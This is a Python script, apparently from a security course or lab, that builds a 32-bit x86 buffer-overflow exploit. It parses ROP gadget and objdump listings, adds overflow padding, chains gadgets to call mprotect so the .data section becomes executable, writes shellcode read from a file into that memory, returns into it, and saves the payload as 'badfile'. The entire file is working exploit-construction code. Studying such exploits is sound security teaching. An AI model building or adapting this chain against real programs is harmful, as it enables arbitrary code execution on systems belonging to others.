from struct import pack

# CONSTANTS
PAGE_LEN = 4096 # intel x86

####
# get shellcode from file and store in list of elements of 4 bytes

shellcode_file_path = "shellcode"

def read_shellcode(file_path):
    with open(file_path, 'r') as f:
        hex_data = f.read().strip()

    byte_list = [int(hex_data[i:i+2], 16) for i in range(0, len(hex_data), 2)]
    return byte_list


# def read_shellcode(file_path):
#     shellcode_bytes = []
#     with open(file_path, "rb") as file:
#         shellcode_bytes = file.read()

#     return shellcode_bytes

shellcode_bytes = read_shellcode(shellcode_file_path)
print(shellcode_bytes)

####
# get and define gadgets

gadgets_filename = "gadgets.txt"

gadgets = {}
instructions = {
    "POPEAX": "pop eax ; ret",
    "POPEDX": "pop edx ; ret",
    "MOVINTOSTACK": "mov dword ptr [edx], eax ; ret",
    "INCEAX": "inc eax ; ret",
    "INCECX": "inc ecx ; ret",
    "INCEBX": "inc ebx ; ret",
    "INCEDX": "inc edx ; ret",
    "XOREAX": "xor eax, eax ; ret",
    "XORECX_POPEBX_MOVEAXECX_POPESI_POPEDI_POPEBP": "xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret",
    "XOREDX_POPEBX_MOVEAXEDX_POPESI_POPEDI": "xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret",
    "POPEBX": "pop ebx ; ret",
    "POPECX": "pop ecx ; ret",
    "POPECXEBX": "pop ecx ; pop ebx ; ret",
    "ADDEAX10_POPEDI": "add eax, 0xa ; pop edi ; ret",
    "SHLECX3_POPEBX_SHLEAXCL_POPESI_POPEDI_POPEBP": "shl ecx, 3 ; pop ebx ; shl eax, cl ; pop esi ; pop edi ; pop ebp ; ret",
    "SHLEAXCL_POPESI_POPEDI_POPEBP": "shl eax, cl ; pop esi ; pop edi ; pop ebp ; ret",
    "INT80": "int 0x80",
    "INT80_RET": "nop ; int 0x80" # ; ret <- this part is left out of the rop gadgets output from ROPgadget
}





def check_line_for_req_gadgets(line):

    line_split = line.split(":")
    gadget_hex_str = line_split[0].strip()
    gadget_instr_str = line_split[1].strip()

    for gadget, instr in instructions.items():

        # check if we already have that gadget
        if gadget not in gadgets:

            if gadget_instr_str == instr:
                gadgets[gadget] = pack('<I', int(gadget_hex_str, 16))

def get_gadgets():
    with open(gadgets_filename, "r") as file:
        for line in file:

            # written so that we only have to loop through the lines of this file once

            if len(line) == 0:
                continue
            if line[0] != "0":
                continue
            
            check_line_for_req_gadgets(line)
    
    gadgets['DUMMY'] = pack('<I', 0x42424242)

get_gadgets()

# GET .data ADDRESS

objdump_filename = "objdump.txt"

def get_dot_data_addr():
    # currently hardcoded
    # TODO: Implement so it finds it dynamically for the program

    with open(objdump_filename, "r") as file:
        for line in file:
            stripped = line.strip()

            splits = stripped.split()

            if len(splits) < 4:
                continue

            if splits[1].strip() == ".data":
                return int(splits[3].strip(), 16)

    # return 0x080da060

def get_page_aligned_addr(addr):
    return addr - (addr % PAGE_LEN)

DATA_ADDR = get_dot_data_addr()

MPROTECT_ADDR = get_page_aligned_addr(DATA_ADDR)

#####
# construct chain to call mprotect on the address where shellcode will be copied into

def get_padding():

    # currently hardcoded but could connect to other program to determine it dynamically
    padding_num = 44
    return "A" * padding_num

rop = b''

# add padding
rop += get_padding().encode('utf-8')

# want to call syscall mprotect to make .data address executable

# edx = 7 for 'PROT code'(?) for rwx and ebx = MPROTECT_ADDR for mprotect
rop += gadgets["XOREDX_POPEBX_MOVEAXEDX_POPESI_POPEDI"]
rop += pack('<I', MPROTECT_ADDR-1)
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["INCEDX"] * 7

# ecx contains len must be multiple of page length ie 4096, here making it 0x1000 = 4096
rop += gadgets["XORECX_POPEBX_MOVEAXECX_POPESI_POPEDI_POPEBP"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["INCECX"]

rop += gadgets["SHLECX3_POPEBX_SHLEAXCL_POPESI_POPEDI_POPEBP"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["SHLECX3_POPEBX_SHLEAXCL_POPESI_POPEDI_POPEBP"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["SHLECX3_POPEBX_SHLEAXCL_POPESI_POPEDI_POPEBP"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["SHLECX3_POPEBX_SHLEAXCL_POPESI_POPEDI_POPEBP"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]
rop += gadgets["DUMMY"]

rop += gadgets["POPEBX"]
rop += pack('<I', MPROTECT_ADDR-1)
rop += gadgets["INCEBX"]

# eax = 125
rop += gadgets["XOREAX"]

for i in range(12):
    rop += gadgets["ADDEAX10_POPEDI"]
    rop += gadgets["DUMMY"]

rop += gadgets["INCEAX"] * 5


rop += gadgets["INT80_RET"]

####
# construct rop to move shellcode into this address

def add_null_term(curr_addr):
    null_rop = b''
    null_rop += gadgets['POPEDX']
    null_rop += pack('<I', curr_addr)
    null_rop += gadgets['XOREAX']
    null_rop += gadgets['MOVINTOSTACK']

    return null_rop

curr_addr = DATA_ADDR

quad_bytes = []

for b in shellcode_bytes:
    print(b, quad_bytes)

    if b == 0:
        print("null found")
        l = len(quad_bytes)
        for i in range(4-l):
            quad_bytes.append(0x42)
        
        rop += gadgets['POPEDX']
        rop += pack('<I', curr_addr)
        rop += gadgets['POPEAX']
        for qb in quad_bytes:
            rop += pack('<I', qb)
        # rop += pack('<I', quad_bytes)
        rop += gadgets['MOVINTOSTACK']

        quad_bytes.clear()

        rop += add_null_term(curr_addr)
        curr_addr += l + 1

    else:
        quad_bytes.append(b)
        # quad_bytes = hex(quad_bytes + hex(b) << (len(str(hex(quad_bytes))) - 2) * 4)

    if len(quad_bytes) == 4:
        rop += gadgets['POPEDX']
        rop += pack('<I', curr_addr)
        rop += gadgets['POPEAX']
        word = 0
        for i in range(4):
            word = word + quad_bytes[i] * (2 ** (i*8))
        print(hex(word))
        rop += pack('<I', word)
        # rop += pack('<I', quad_bytes)
        rop += gadgets['MOVINTOSTACK']

        quad_bytes.clear()
        curr_addr += 4

if len(quad_bytes) > 0:
    l = len(quad_bytes)
    rop += gadgets['POPEDX']
    rop += pack('<I', curr_addr)
    rop += gadgets['POPEAX']
    word = 0
    for i in range(l):
        word = word + quad_bytes[i] * (2 ** (i*8))
    for i in range(4-l):
        word = word + 0x42 * (2 ** ((i+l)*8))
    print(hex(word))
    rop += pack('<I', word)
    # rop += pack('<I', quad_bytes)
    rop += gadgets['MOVINTOSTACK']

    quad_bytes.clear()
    curr_addr += l

####
# append address above to rop chain

rop += pack("<I", DATA_ADDR)

####
# write rop chain to badfile

with open("badfile", "wb") as f:
    f.write(rop)
